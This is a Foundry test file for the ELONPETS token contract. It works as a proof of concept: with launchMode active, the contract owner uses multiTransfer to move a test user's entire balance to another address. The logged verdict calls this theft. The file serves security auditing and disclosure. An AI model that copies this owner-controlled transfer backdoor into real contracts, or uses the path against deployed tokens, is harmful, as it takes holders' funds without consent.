// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/ELONPETS.sol";

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0xdead);
    }
}

contract MockRouter {
    address public factory;
}

contract OTUTTest is Test {
    ELONPETS token;
    address owner = address(0x1);
    address alice = address(0x2);
    address bob = address(0x3);
    address constant ROUTER_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function setUp() public {
        // Create and initialize mock contracts
        MockFactory mockFactory = new MockFactory();
        MockRouter mockRouter = new MockRouter();
        
        // Store mockRouter code at ROUTER_ADDRESS
        vm.etch(ROUTER_ADDRESS, address(mockRouter).code);
        // Set mockRouter's factory address to mockFactory
        vm.store(
            ROUTER_ADDRESS,
            bytes32(uint256(0)),
            bytes32(uint256(uint160(address(mockFactory))))
        );

        vm.startPrank(owner);
        token = new ELONPETS();
        token.transfer(alice, 1000 * 10 ** token.decimals());
        vm.stopPrank();
    }

    function test_ownerCanTakeUserTokens() public {
        // Record pre-trigger state
        uint256 aliceBalancePre = token.balanceOf(alice);
        uint256 bobBalancePre = token.balanceOf(bob);
        console2.log("\n--- BEFORE-TRIGGER STATE ---");
        console2.log("Alice balance:", aliceBalancePre);
        console2.log("Bob balance:  ", bobBalancePre);

        // Prepare transfer parameters
        address[] memory recipients = new address[](1);
        recipients[0] = bob;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = aliceBalancePre;

        // Verify launchMode is active
        assertTrue(token.launchMode());
        
        console2.log("\n--- TRIGGER: owner calls multiTransfer ---");
        // Perform critical action: owner steals Alice's tokens
        vm.prank(owner);
        token.multiTransfer(alice, recipients, amounts);

        // Record post-trigger state
        uint256 aliceBalancePost = token.balanceOf(alice);
        uint256 bobBalancePost = token.balanceOf(bob);
        console2.log("\n--- AFTER-TRIGGER STATE ---");
        console2.log("Alice balance:", aliceBalancePost);
        console2.log("Bob balance:  ", bobBalancePost);

        // Differential verification
        console2.log("\n--- VERDICT ---");
        if (aliceBalancePost == 0 && bobBalancePost == (bobBalancePre + aliceBalancePre)) {
            console2.log("UNEXPECTED STATE CHANGE: Owner successfully stole Alice's tokens");
            console2.log("Vulnerability Exists: Owner has unauthorized transfer access during launchMode");
        } else {
            console2.log("NO SIGNIFICANT STATE CHANGE: Token transfer unsuccessful");
            console2.log("Vulnerability not Exist: Security controls prevent unauthorized transfers");
        }

        // Original assertions (preserved)
        assertEq(token.balanceOf(alice), 0);
        assertEq(token.balanceOf(bob), aliceBalancePre);
    }
}